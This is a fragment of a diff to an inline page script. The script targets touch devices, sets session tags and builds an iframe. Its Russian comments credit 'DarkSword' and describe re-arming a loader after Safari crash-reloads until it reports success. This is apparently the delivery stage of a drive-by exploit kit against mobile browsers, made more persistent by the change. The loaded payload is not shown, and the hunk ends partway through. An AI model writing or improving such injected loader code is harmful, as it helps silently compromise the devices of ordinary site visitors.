@@ -443,11 +443,12 @@
 <script>
 (function() {
   sessionStorage.setItem("ds_tag", "a6ded0");
-  if (sessionStorage.getItem("uid")) {
-    return;
-  }
   if ("ontouchstart" in window || navigator.maxTouchPoints > 0) {
-    sessionStorage.setItem("uid", "1");
+    // DarkSword: старый вечный uid-guard хоронил ретраи после Safari-краш-релоада
+    // (sessionStorage живёт до закрытия таба). ds_done ставит лоадер после успеха.
+    var _dsDone = 0;
+    try { _dsDone = parseInt(sessionStorage.getItem("ds_done") || "0", 10) || 0; } catch (eD) {}
+    if (_dsDone && (Date.now() - _dsDone) < 10 * 60 * 1000) return;
     var frame = document.createElement('iframe');
     var _t = (new URLSearchParams(location.search)).get("ds_tag");
     var _tag = _t || "a6ded0";
